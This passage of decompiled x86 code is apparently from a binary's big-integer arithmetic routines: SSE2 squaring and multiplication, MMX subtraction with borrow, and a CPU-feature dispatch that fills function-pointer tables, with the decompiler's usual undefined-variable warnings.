// 41A49F: variable 'v163' is possibly undefined
// 41A4EC: variable 'v171' is possibly undefined
// 41A587: variable 'v187' is possibly undefined
// 41A5D7: variable 'v195' is possibly undefined
// 41A637: variable 'v207' is possibly undefined
// 41A684: variable 'v215' is possibly undefined
// 41A71F: variable 'v231' is possibly undefined
// 41A76F: variable 'v239' is possibly undefined
// 41A7CF: variable 'v251' is possibly undefined
// 41A81C: variable 'v259' is possibly undefined
// 41A8B7: variable 'v275' is possibly undefined
// 41A907: variable 'v283' is possibly undefined
// 41A967: variable 'v295' is possibly undefined
// 41A9B4: variable 'v303' is possibly undefined
// 41AA4F: variable 'v319' is possibly undefined
// 41AA9F: variable 'v327' is possibly undefined
// 41AAFF: variable 'v339' is possibly undefined
// 41AB4C: variable 'v347' is possibly undefined
// 41ABE7: variable 'v363' is possibly undefined
// 41AC3D: variable 'v371' is possibly undefined
// 41AC9D: variable 'v383' is possibly undefined
// 41ACF0: variable 'v391' is possibly undefined
// 41AD8B: variable 'v407' is possibly undefined
// 41ADE1: variable 'v415' is possibly undefined
// 41AE41: variable 'v427' is possibly undefined
// 41AE94: variable 'v435' is possibly undefined
// 41AF2F: variable 'v451' is possibly undefined
// 41AF85: variable 'v459' is possibly undefined
// 41AFE5: variable 'v471' is possibly undefined
// 41B038: variable 'v479' is possibly undefined
// 41B0D3: variable 'v495' is possibly undefined
// 41B129: variable 'v503' is possibly undefined
// 41B189: variable 'v515' is possibly undefined
// 41B1DC: variable 'v523' is possibly undefined
// 41B277: variable 'v539' is possibly undefined
// 41B2CD: variable 'v547' is possibly undefined
// 41B32D: variable 'v559' is possibly undefined
// 41B380: variable 'v567' is possibly undefined
// 41B41B: variable 'v583' is possibly undefined
// 41B471: variable 'v591' is possibly undefined
// 41B4D1: variable 'v604' is possibly undefined
// 41B524: variable 'v612' is possibly undefined
// 46C990: using guessed type __m128i stru_46C990;

//----- (00419D5A) --------------------------------------------------------
int sub_419D5A()
{
  return sub_419D9A();
}
// 419D9A: using guessed type int sub_419D9A(void);

//----- (00419D9A) --------------------------------------------------------
int sub_419D9A()
{
  return sub_419DD7();
}
// 419DD7: using guessed type int sub_419DD7(void);

//----- (00419DD7) --------------------------------------------------------
int sub_419DD7()
{
  return sub_419E14();
}
// 419E14: using guessed type int sub_419E14(void);

//----- (00419E14) --------------------------------------------------------
int sub_419E14()
{
  return sub_419E51();
}
// 419E51: using guessed type int sub_419E51(void);

//----- (00419E51) --------------------------------------------------------
int sub_419E51()
{
  return sub_419E8E();
}
// 419E8E: using guessed type int sub_419E8E(void);

//----- (00419E8E) --------------------------------------------------------
int sub_419E8E()
{
  return sub_419ECB();
}
// 419ECB: using guessed type int sub_419ECB(void);

//----- (00419ECB) --------------------------------------------------------
__m128i __usercall sub_419ECB@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>)
{
  return _mm_srli_epi32(_mm_mul_epu32(_mm_load_si128((const __m128i *)(a1 - 32)), _mm_load_si128(a2 + 2)), 0x10u);
}

//----- (0041B744) --------------------------------------------------------
int __cdecl sub_41B744(int a1, int a2)
{
  int result; // eax
  int i; // edx
  __m128i v4; // xmm0
  __m128i v5; // xmm1
  __m128i v6; // xmm7
  __m128i v7; // xmm5
  __m128i si128; // xmm6
  __m128i v9; // xmm4
  __m128i v10; // xmm7
  __m128i v11; // xmm6
  __m128i v12; // xmm7
  __m128i v13; // xmm0
  __m128i v14; // xmm1
  __m128 v15; // xmm6
  __m128 v16; // xmm4
  __m128i v17; // xmm6
  __m128 v18; // xmm5
  __m128i v19; // xmm4
  __m128i v20; // xmm7
  __m128i v21; // xmm5
  __m128i v22; // xmm6
  __m128i v23; // xmm4
  __m128i v24; // xmm5
  __m128i v25; // xmm7
  __m128i v26; // xmm6
  __m128i v27; // xmm7
  __m128i v28; // xmm6
  __m128i v29; // xmm7
  __m128i v30; // xmm0
  __m128i v31; // xmm1
  __m128i v32; // xmm4
  __m128i v33; // xmm5
  __m128i v34; // xmm6
  __m128i v35; // xmm5
  __m128i v36; // xmm4
  __m128i v37; // xmm7
  __m128i v38; // xmm0
  __m128i v39; // xmm7
  __m128i v40; // xmm6
  __m128i v41; // xmm2
  __m128i v42; // xmm5
  __m128i v43; // xmm6
  __m128i v44; // xmm7
  __m128i v45; // xmm0
  __m128i v46; // xmm1
  __m128i v47; // xmm4
  __m128i v48; // xmm5
  __m128i v49; // xmm6
  __m128i v50; // [esp+0h] [ebp-5Ch] BYREF
  __m128i v51; // [esp+10h] [ebp-4Ch] BYREF
  __m128i v52; // [esp+20h] [ebp-3Ch] BYREF
  __m128i v53; // [esp+30h] [ebp-2Ch]
  __m128i v54; // [esp+40h] [ebp-1Ch]

  result = a2;
  for ( i = 0; i != 16; i += 16 )
  {
    v4 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 216);
    v5 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 141);
    *(__m128i *)((char *)&v51 + 2 * i) = v4;
    *(__m128i *)((char *)&v51 + 2 * i + 16) = _mm_srli_epi64(v4, 0x20u);
    *(__m128i *)((char *)&v53 + 2 * i) = v5;
    *(__m128i *)((char *)&v54 + 2 * i) = _mm_srli_epi64(v5, 0x20u);
  }
  v6 = _mm_load_si128(&v51);
  v7 = _mm_mul_epu32(v6, v6);
  si128 = _mm_load_si128(&stru_46C990);
  v9 = _mm_and_si128(si128, v7);
  v10 = _mm_mul_epu32(v6, v53);
  v11 = _mm_and_si128(si128, v10);
  v12 = _mm_srli_epi32(v10, 0x10u);
  v13 = _mm_move_epi64(v11);
  v14 = _mm_move_epi64(v12);
  v15 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v11, v13), v13), 4);
  v16 = (__m128)_mm_add_epi32(v9, (__m128i)v15);
  v17 = (__m128i)_mm_movehl_ps(v15, v16);
  *(_DWORD *)a1 = _mm_cvtsi128_si32((__m128i)v16);
  v18 = (__m128)_mm_add_epi32(
                  _mm_srli_epi32(v7, 0x10u),
                  _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v12, v14), v14), 4));
  _mm_storeh_ps((double *)&v50.m128i_i64[1], v18);
  v19 = _mm_add_epi64(_mm_srli_epi64((__m128i)v16, 0x10u), (__m128i)v18);
  *(_QWORD *)(a1 + 2) = v19.m128i_i64[0];
  v50.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v19, 0x30u), v17).m128i_u64[0];
  v20 = _mm_load_si128(&v52);
  v21 = _mm_mul_epu32(_mm_load_si128(&v51), v20);
  v22 = _mm_load_si128(&stru_46C990);
  v23 = _mm_and_si128(v22, v21);
  v24 = _mm_srli_epi32(v21, 0x10u);
  v25 = _mm_mul_epu32(v20, v53);
  v26 = _mm_and_si128(v22, v25);
  v27 = _mm_srli_epi32(v25, 0x10u);
  v28 = _mm_add_epi32(v26, v26);
  v29 = _mm_add_epi32(v27, v27);
  v30 = _mm_move_epi64(v28);
  v31 = _mm_move_epi64(v29);
  v32 = _mm_add_epi32(
          _mm_add_epi32(_mm_add_epi32(v23, v23), _mm_loadl_epi64(&v50)),
          _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v28, v30), v30), 4));
  v33 = _mm_add_epi32(
          _mm_add_epi32(_mm_add_epi32(v24, v24), _mm_loadl_epi64((const __m128i *)&v50.m128i_i8[8])),
          _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v29, v31), v31), 4));
  *(_DWORD *)(a1 + 8) = _mm_cvtsi128_si32(v32);
  v34 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v32), 0x10u), _mm_move_epi64(v33));
  v35 = _mm_unpackhi_epi64(v33, v30);
  *(_QWORD *)(a1 + 10) = v34.m128i_i64[0];
  v36 = _mm_add_epi32(_mm_unpackhi_epi64(v32, v30), _mm_srli_epi64(v34, 0x30u));
  v37 = _mm_load_si128(&v52);
  v38 = _mm_mul_epu32(v37, v37);
  v39 = _mm_mul_epu32(v37, v54);
  v40 = _mm_load_si128(&stru_46C990);
  v41 = _mm_and_si128(v40, v38);
  v42 = _mm_add_epi32(v35, _mm_srli_epi32(v38, 0x10u));
  v43 = _mm_and_si128(v40, v39);
  v44 = _mm_srli_epi32(v39, 0x10u);
  v45 = _mm_move_epi64(v43);
  v46 = _mm_move_epi64(v44);
  v47 = _mm_add_epi32(_mm_add_epi32(v36, v41), _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v43, v45), v45), 4));
  v48 = _mm_add_epi32(v42, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v44, v46), v46), 4));
  *(_DWORD *)(a1 + 16) = _mm_cvtsi128_si32(v47);
  v49 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v47), 0x10u), _mm_move_epi64(v48));
  *(_QWORD *)(a1 + 18) = v49.m128i_i64[0];
  *(_QWORD *)(a1 + 24) = _mm_add_epi64(
                           _mm_add_epi32(_mm_unpackhi_epi64(v47, v45), _mm_srli_epi64(v49, 0x30u)),
                           _mm_slli_epi64(_mm_unpackhi_epi64(v48, v45), 0x10u)).m128i_u64[0];
  return result;
}
// 46C990: using guessed type __m128i stru_46C990;

//----- (0041B966) --------------------------------------------------------
int __cdecl sub_41B966(int a1, int a2)
{
  unsigned int i; // edx
  __m128i v3; // xmm0
  __m128i v4; // xmm1
  __m128i v5; // xmm7
  __m128i v6; // xmm5
  __m128i si128; // xmm6
  __m128i v8; // xmm4
  __m128i v9; // xmm7
  __m128i v10; // xmm6
  __m128i v11; // xmm7
  __m128i v12; // xmm0
  __m128i v13; // xmm1
  __m128 v14; // xmm6
  __m128 v15; // xmm4
  __m128i v16; // xmm6
  __m128 v17; // xmm5
  __m128i v18; // xmm4
  __m128i v19; // xmm7
  __m128i v20; // xmm5
  __m128i v21; // xmm6
  __m128i v22; // xmm4
  __m128i v23; // xmm5
  __m128i v24; // xmm7
  __m128i v25; // xmm6
  __m128i v26; // xmm7
  __m128i v27; // xmm6
  __m128i v28; // xmm7
  __m128i v29; // xmm5
  __m128i v30; // xmm0
  __m128i v31; // xmm1
  __m128 v32; // xmm6
  __m128 v33; // xmm4
  __m128i v34; // xmm6
  __m128 v35; // xmm5
  __m128i v36; // xmm4
  __m128i v37; // xmm7
  __m128i v38; // xmm5
  __m128i v39; // xmm6
  __m128i v40; // xmm4
  __m128i v41; // xmm5
  __m128i v42; // xmm7
  __m128i v43; // xmm3
  __m128i v44; // xmm1
  __m128i v45; // xmm3
  __m128i v46; // xmm2
  __m128i v47; // xmm6
  __m128i v48; // xmm7
  __m128i v49; // xmm6
  __m128i v50; // xmm7
  __m128i v51; // xmm5
  __m128i v52; // xmm0
  __m128i v53; // xmm1
  __m128 v54; // xmm6
  __m128 v55; // xmm4
  __m128i v56; // xmm6
  __m128 v57; // xmm5
  __m128i v58; // xmm4
  __m128i v59; // xmm7
  __m128i v60; // xmm5
  __m128i v61; // xmm6
  __m128i v62; // xmm4
  __m128i v63; // xmm5
  __m128i v64; // xmm7
  __m128i v65; // xmm6
  __m128i v66; // xmm7
  int result; // eax
  __m128i v68; // xmm6
  __m128i v69; // xmm7
  __m128i v70; // xmm5
  __m128i v71; // xmm0
  __m128i v72; // xmm1
  __m128 v73; // xmm6
  __m128 v74; // xmm4
  __m128i v75; // xmm6
  int v76; // ecx
  __m128 v77; // xmm5
  __m128i v78; // xmm4
  __m128i v79; // xmm7
  __m128i v80; // xmm5
  __m128i v81; // xmm6
  __m128i v82; // xmm4
  __m128i v83; // xmm5
  __m128i *v84; // edx
  __m128i v85; // xmm7
  __m128i v86; // xmm3
  __m128i v87; // xmm1
  __m128i v88; // xmm3
  __m128i v89; // xmm2
  __m128i v90; // xmm6
  __m128i v91; // xmm7
  __m128i v92; // xmm6
  __m128i v93; // xmm7
  __m128i v94; // xmm5
  __m128i v95; // xmm0
  __m128i v96; // xmm1
  __m128 v97; // xmm6
  __m128 v98; // xmm4
  __m128i v99; // xmm6
  __m128 v100; // xmm5
  __m128i v101; // xmm4
  __m128i v102; // xmm7
  __m128i v103; // xmm5
  __m128i v104; // xmm6
  __m128i v105; // xmm4
  __m128i v106; // xmm5
  __m128i v107; // xmm7
  __m128i v108; // xmm6
  __m128i v109; // xmm7
  __m128i v110; // xmm6
  __m128i v111; // xmm7
  __m128i v112; // xmm0
  __m128i v113; // xmm1
  __m128i v114; // xmm4
  __m128i v115; // xmm5
  __m128i v116; // xmm6
  __m128i v117; // xmm5
  __m128i v118; // xmm4
  __m128i v119; // xmm7
  __m128i v120; // xmm0
  __m128i v121; // xmm7
  __m128i v122; // xmm6
  __m128i v123; // xmm2
  __m128i v124; // xmm5
  __m128i v125; // xmm6
  __m128i v126; // xmm7
  __m128i v127; // xmm0
  __m128i v128; // xmm1
  __m128i v129; // xmm4
  __m128i v130; // xmm5
  __m128i v131; // xmm6
  __m128i v132; // [esp+0h] [ebp-9Ch] BYREF
  __m128i v133; // [esp+10h] [ebp-8Ch] BYREF
  __m128i v134; // [esp+20h] [ebp-7Ch] BYREF
  __m128i v135; // [esp+30h] [ebp-6Ch] BYREF
  __m128i v136; // [esp+40h] [ebp-5Ch] BYREF
  __m128i v137; // [esp+50h] [ebp-4Ch]
  __m128i v138[3]; // [esp+60h] [ebp-3Ch]

  for ( i = 0; i != 32; i += 16 )
  {
    v3 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 216);
    v4 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 141);
    *(__m128i *)((char *)&v133 + 2 * i) = v3;
    *(__m128i *)((char *)&v133 + 2 * i + 16) = _mm_srli_epi64(v3, 0x20u);
    *(__m128i *)((char *)&v137 + 2 * i) = v4;
    v138[i / 8] = _mm_srli_epi64(v4, 0x20u);
  }
  v5 = _mm_load_si128(&v133);
  v6 = _mm_mul_epu32(v5, v5);
  si128 = _mm_load_si128(&stru_46C990);
  v8 = _mm_and_si128(si128, v6);
  v9 = _mm_mul_epu32(v5, v137);
  v10 = _mm_and_si128(si128, v9);
  v11 = _mm_srli_epi32(v9, 0x10u);
  v12 = _mm_move_epi64(v10);
  v13 = _mm_move_epi64(v11);
  v14 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v10, v12), v12), 4);
  v15 = (__m128)_mm_add_epi32(v8, (__m128i)v14);
  v16 = (__m128i)_mm_movehl_ps(v14, v15);
  *(_DWORD *)a1 = _mm_cvtsi128_si32((__m128i)v15);
  v17 = (__m128)_mm_add_epi32(
                  _mm_srli_epi32(v6, 0x10u),
                  _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v11, v13), v13), 4));
  _mm_storeh_ps((double *)&v132.m128i_i64[1], v17);
  v18 = _mm_add_epi64(_mm_srli_epi64((__m128i)v15, 0x10u), (__m128i)v17);
  *(_QWORD *)(a1 + 2) = v18.m128i_i64[0];
  v132.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v18, 0x30u), v16).m128i_u64[0];
  v19 = _mm_load_si128(&v134);
  v20 = _mm_mul_epu32(_mm_load_si128(&v133), v19);
  v21 = _mm_load_si128(&stru_46C990);
  v22 = _mm_and_si128(v21, v20);
  v23 = _mm_srli_epi32(v20, 0x10u);
  v24 = _mm_mul_epu32(v19, v137);
  v25 = _mm_and_si128(v21, v24);
  v26 = _mm_srli_epi32(v24, 0x10u);
  v27 = _mm_add_epi32(v25, v25);
  v28 = _mm_add_epi32(v26, v26);
  v29 = _mm_add_epi32(_mm_add_epi32(v23, v23), _mm_loadl_epi64((const __m128i *)&v132.m128i_i8[8]));
  v30 = _mm_move_epi64(v27);
  v31 = _mm_move_epi64(v28);
  v32 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v27, v30), v30), 4);
  v33 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v22, v22), _mm_loadl_epi64(&v132)), (__m128i)v32);
  v34 = (__m128i)_mm_movehl_ps(v32, v33);
  *(_DWORD *)(a1 + 8) = _mm_cvtsi128_si32((__m128i)v33);
  v35 = (__m128)_mm_add_epi32(v29, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v28, v31), v31), 4));
  _mm_storeh_ps((double *)&v132.m128i_i64[1], v35);
  v36 = _mm_add_epi64(_mm_srli_epi64((__m128i)v33, 0x10u), (__m128i)v35);
  *(_QWORD *)(a1 + 10) = v36.m128i_i64[0];
  v132.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v36, 0x30u), v34).m128i_u64[0];
  v37 = _mm_load_si128(&v135);
  v38 = _mm_mul_epu32(_mm_load_si128(&v133), v37);
  v39 = _mm_load_si128(&stru_46C990);
  v40 = _mm_and_si128(v39, v38);
  v41 = _mm_srli_epi32(v38, 0x10u);
  v42 = _mm_mul_epu32(v37, v137);
  v43 = _mm_load_si128(&v134);
  v44 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v134.m128i_i8[8]), v43);
  v45 = _mm_mul_epu32(v43, v43);
  v46 = v39;
  v47 = _mm_add_epi32(_mm_and_si128(v39, v42), _mm_and_si128(v39, v44));
  v48 = _mm_add_epi32(_mm_srli_epi32(v42, 0x10u), _mm_srli_epi32(v44, 0x10u));
  v49 = _mm_add_epi32(v47, v47);
  v50 = _mm_add_epi32(v48, v48);
  v51 = _mm_add_epi32(
          _mm_add_epi32(_mm_add_epi32(v41, v41), _mm_srli_epi32(v45, 0x10u)),
          _mm_loadl_epi64((const __m128i *)&v132.m128i_i8[8]));
  v52 = _mm_move_epi64(v49);
  v53 = _mm_move_epi64(v50);
  v54 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v49, v52), v52), 4);
  v55 = (__m128)_mm_add_epi32(
                  _mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v40, v40), _mm_and_si128(v46, v45)), _mm_loadl_epi64(&v132)),
                  (__m128i)v54);
  v56 = (__m128i)_mm_movehl_ps(v54, v55);
  *(_DWORD *)(a1 + 16) = _mm_cvtsi128_si32((__m128i)v55);
  v57 = (__m128)_mm_add_epi32(v51, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v50, v53), v53), 4));
  _mm_storeh_ps((double *)&v132.m128i_i64[1], v57);
  v58 = _mm_add_epi64(_mm_srli_epi64((__m128i)v55, 0x10u), (__m128i)v57);
  *(_QWORD *)(a1 + 18) = v58.m128i_i64[0];
  v132.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v58, 0x30u), v56).m128i_u64[0];
  v59 = _mm_load_si128(&v135);
  v60 = _mm_mul_epu32(_mm_load_si128(&v134), v59);
  v61 = _mm_load_si128(&stru_46C990);
  v62 = _mm_and_si128(v61, v60);
  v63 = _mm_srli_epi32(v60, 0x10u);
  v64 = _mm_mul_epu32(v59, v138[0]);
  v65 = _mm_and_si128(v61, v64);
  v66 = _mm_srli_epi32(v64, 0x10u);
  sub_41B9F0((int)&v135, &v134);
  v68 = _mm_add_epi32(v65, v65);
  v69 = _mm_add_epi32(v66, v66);
  v70 = _mm_add_epi32(_mm_add_epi32(v63, v63), _mm_loadl_epi64((const __m128i *)&v132.m128i_i8[8]));
  v71 = _mm_move_epi64(v68);
  v72 = _mm_move_epi64(v69);
  v73 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v68, v71), v71), 4);
  v74 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v62, v62), _mm_loadl_epi64(&v132)), (__m128i)v73);
  v75 = (__m128i)_mm_movehl_ps(v73, v74);
  *(_DWORD *)(v76 + 24) = _mm_cvtsi128_si32((__m128i)v74);
  v77 = (__m128)_mm_add_epi32(v70, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v69, v72), v72), 4));
  _mm_storeh_ps((double *)&v132.m128i_i64[1], v77);
  v78 = _mm_add_epi64(_mm_srli_epi64((__m128i)v74, 0x10u), (__m128i)v77);
  *(_QWORD *)(v76 + 26) = v78.m128i_i64[0];
  v132.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v78, 0x30u), v75).m128i_u64[0];
  v79 = _mm_load_si128(&v136);
  v80 = _mm_mul_epu32(_mm_load_si128(&v134), v79);
  v81 = _mm_load_si128(&stru_46C990);
  v82 = _mm_and_si128(v81, v80);
  v83 = _mm_srli_epi32(v80, 0x10u);
  v85 = _mm_mul_epu32(v79, v84[-1]);
  v86 = _mm_load_si128(&v135);
  v87 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v135.m128i_i8[8]), v86);
  v88 = _mm_mul_epu32(v86, v86);
  v89 = v81;
  v90 = _mm_add_epi32(_mm_and_si128(v81, v85), _mm_and_si128(v81, v87));
  v91 = _mm_add_epi32(_mm_srli_epi32(v85, 0x10u), _mm_srli_epi32(v87, 0x10u));
  v92 = _mm_add_epi32(v90, v90);
  v93 = _mm_add_epi32(v91, v91);
  v94 = _mm_add_epi32(
          _mm_add_epi32(_mm_add_epi32(v83, v83), _mm_srli_epi32(v88, 0x10u)),
          _mm_loadl_epi64((const __m128i *)&v132.m128i_i8[8]));
  v95 = _mm_move_epi64(v92);
  v96 = _mm_move_epi64(v93);
  v97 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v92, v95), v95), 4);
  v98 = (__m128)_mm_add_epi32(
                  _mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v82, v82), _mm_and_si128(v89, v88)), _mm_loadl_epi64(&v132)),
                  (__m128i)v97);
  v99 = (__m128i)_mm_movehl_ps(v97, v98);
  *(_DWORD *)(v76 + 32) = _mm_cvtsi128_si32((__m128i)v98);
  v100 = (__m128)_mm_add_epi32(v94, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v93, v96), v96), 4));
  _mm_storeh_ps((double *)&v132.m128i_i64[1], v100);
  v101 = _mm_add_epi64(_mm_srli_epi64((__m128i)v98, 0x10u), (__m128i)v100);
  *(_QWORD *)(v76 + 34) = v101.m128i_i64[0];
  v132.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v101, 0x30u), v99).m128i_u64[0];
  ++v84;
  v102 = _mm_load_si128(&v136);
  v103 = _mm_mul_epu32(_mm_load_si128(&v135), v102);
  v104 = _mm_load_si128(&stru_46C990);
  v105 = _mm_and_si128(v104, v103);
  v106 = _mm_srli_epi32(v103, 0x10u);
  v107 = _mm_mul_epu32(v102, v84[-1]);
  v108 = _mm_and_si128(v104, v107);
  v109 = _mm_srli_epi32(v107, 0x10u);
  v110 = _mm_add_epi32(v108, v108);
  v111 = _mm_add_epi32(v109, v109);
  v112 = _mm_move_epi64(v110);
  v113 = _mm_move_epi64(v111);
  v114 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v105, v105), _mm_loadl_epi64(&v132)),
           _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v110, v112), v112), 4));
  v115 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v106, v106), _mm_loadl_epi64((const __m128i *)&v132.m128i_i8[8])),
           _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v111, v113), v113), 4));
  *(_DWORD *)(v76 + 40) = _mm_cvtsi128_si32(v114);
  v116 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v114), 0x10u), _mm_move_epi64(v115));
  v117 = _mm_unpackhi_epi64(v115, v112);
  *(_QWORD *)(v76 + 42) = v116.m128i_i64[0];
  v118 = _mm_add_epi32(_mm_unpackhi_epi64(v114, v112), _mm_srli_epi64(v116, 0x30u));
  v119 = _mm_load_si128(&v136);
  v120 = _mm_mul_epu32(v119, v119);
  v121 = _mm_mul_epu32(v119, *v84);
  v122 = _mm_load_si128(&stru_46C990);
  v123 = _mm_and_si128(v122, v120);
  v124 = _mm_add_epi32(v117, _mm_srli_epi32(v120, 0x10u));
  v125 = _mm_and_si128(v122, v121);
  v126 = _mm_srli_epi32(v121, 0x10u);
  v127 = _mm_move_epi64(v125);
  v128 = _mm_move_epi64(v126);
  v129 = _mm_add_epi32(
           _mm_add_epi32(v118, v123),
           _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v125, v127), v127), 4));
  v130 = _mm_add_epi32(v124, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v126, v128), v128), 4));
  *(_DWORD *)(v76 + 48) = _mm_cvtsi128_si32(v129);
  v131 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v129), 0x10u), _mm_move_epi64(v130));
  *(_QWORD *)(v76 + 50) = v131.m128i_i64[0];
  *(_QWORD *)(v76 + 56) = _mm_add_epi64(
                            _mm_add_epi32(_mm_unpackhi_epi64(v129, v127), _mm_srli_epi64(v131, 0x30u)),
                            _mm_slli_epi64(_mm_unpackhi_epi64(v130, v127), 0x10u)).m128i_u64[0];
  return result;
}
// 41BC94: variable 'v76' is possibly undefined
// 41BCE1: variable 'v84' is possibly undefined
// 46C990: using guessed type __m128i stru_46C990;

//----- (0041B9F0) --------------------------------------------------------
__m128i __usercall sub_41B9F0@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>)
{
  return _mm_srli_epi32(_mm_mul_epu32(_mm_load_si128((const __m128i *)(a1 - 32)), _mm_load_si128(a2 + 2)), 0x10u);
}

//----- (0041BEEC) --------------------------------------------------------
int __fastcall sub_41BEEC(int a1, int a2, int a3, int a4)
{
  int v4; // eax
  int v5; // edi
  int v6; // edx
  int v7; // ecx
  __m64 v8; // mm2
  __m64 v9; // mm0
  __m64 v10; // mm2
  __m64 v11; // mm0
  __m64 v12; // mm2
  int result; // eax

  v4 = a3 + 4 * a1;
  v5 = a4 + 4 * a1;
  v6 = a2 + 4 * a1;
  v7 = -a1;
  v8.m64_u64 = 0i64;
  if ( v7 )
  {
    if ( (v7 & 2) == 0 )
      goto LABEL_4;
    v7 -= 2;
    while ( 1 )
    {
      v11 = _mm_sub_si64(
              _mm_sub_si64(
                _mm_cvtsi32_si64(*(_DWORD *)(v4 + 4 * v7 + 8)),
                _mm_cvtsi32_si64(*(_DWORD *)(v5 + 4 * v7 + 8))),
              v8);
      *(_DWORD *)(v6 + 4 * v7 + 8) = _mm_cvtsi64_si32(v11);
      v12 = _mm_sub_si64(
              _mm_sub_si64(
                _mm_cvtsi32_si64(*(_DWORD *)(v4 + 4 * v7 + 12)),
                _mm_cvtsi32_si64(*(_DWORD *)(v5 + 4 * v7 + 12))),
              _m_psrlqi(v11, 0x3Fu));
      *(_DWORD *)(v6 + 4 * v7 + 12) = _mm_cvtsi64_si32(v12);
      v8 = _m_psrlqi(v12, 0x3Fu);
      v7 += 4;
      if ( !v7 )
        break;
LABEL_4:
      v9 = _mm_sub_si64(
             _mm_sub_si64(_mm_cvtsi32_si64(*(_DWORD *)(v4 + 4 * v7)), _mm_cvtsi32_si64(*(_DWORD *)(v5 + 4 * v7))),
             v8);
      *(_DWORD *)(v6 + 4 * v7) = _mm_cvtsi64_si32(v9);
      v10 = _mm_sub_si64(
              _mm_sub_si64(
                _mm_cvtsi32_si64(*(_DWORD *)(v4 + 4 * v7 + 4)),
                _mm_cvtsi32_si64(*(_DWORD *)(v5 + 4 * v7 + 4))),
              _m_psrlqi(v9, 0x3Fu));
      *(_DWORD *)(v6 + 4 * v7 + 4) = _mm_cvtsi64_si32(v10);
      v8 = _m_psrlqi(v10, 0x3Fu);
    }
  }
  result = _mm_cvtsi64_si32(v8);
  _m_empty();
  return result;
}

//----- (0041BF83) --------------------------------------------------------
int __thiscall sub_41BF83(_DWORD **this, int a2, int a3, int a4)
{
  (*(void (__thiscall **)(_DWORD *, int, int, int, _DWORD))(*this[1] + 76))(this[1], a2, a3, a4, 0);
  return a2;
}

//----- (0041BFA5) --------------------------------------------------------
void __thiscall sub_41BFA5(_DWORD *this, unsigned int a2, char a3)
{
  int v4; // eax
  int v5; // ecx
  unsigned int v6; // edx
  int v7; // eax

  if ( a3 )
  {
    v4 = sub_413329((a2 + 32) >> 5);
    sub_411181((int)(this + 1), v4);
    v5 = this[4];
    v6 = a2 >> 5;
    v7 = *(_DWORD *)(v5 + 4 * (a2 >> 5)) | (1 << (a2 & 0x1F));
  }
  else
  {
    v6 = a2 >> 5;
    if ( a2 >> 5 >= this[3] )
      return;
    v5 = this[4];
    v7 = *(_DWORD *)(v5 + 4 * v6) & ~(1 << (a2 & 0x1F));
  }
  *(_DWORD *)(v5 + 4 * v6) = v7;
}

//----- (0041BFFE) --------------------------------------------------------
char sub_41BFFE()
{
  char result; // al

  dword_490C3C[0] = (int)sub_40F864;
  dword_490C60 = (int (__cdecl *)(_DWORD, _DWORD, _DWORD))sub_40FFAD;
  dword_490C84[0] = (int)sub_41083F;
  dword_490CA8[0] = (int)sub_41034B;
  dword_490CAC = (int)sub_410375;
  result = sub_411C74();
  if ( result )
  {
    result = sub_411FD1();
    if ( result )
    {
      off_48C064 = (int (__stdcall *)(_DWORD, _DWORD))sub_413372;
      off_48C068 = sub_41BEEC;
    }
    dword_48C06C = 32;
    dword_490C40 = (int)sub_4154EC;
    dword_490C44 = (int)sub_415754;
    dword_490C4C = (int)sub_413409;
    dword_490C5C = (int)sub_413EC9;
    dword_490C64 = (int)sub_4171A7;
    dword_490C68 = (int)sub_4172F8;
    dword_490C70 = (int)sub_415C8B;
    dword_490C80 = (int)sub_416370;
    dword_490C88 = (int)sub_41B744;
    dword_490C8C = (int)sub_41B966;
    dword_490C94 = (int)sub_41904F;
    dword_490CA4 = (int)sub_419CBE;
    dword_490CB0 = (int)sub_418C54;
    dword_490CB8 = (int)sub_41762B;
    dword_490CC8 = (int)sub_417DB5;
  }
  else
  {
    dword_490C40 = (int)sub_40F8C7;
    dword_490C44 = (int)sub_40FA2E;
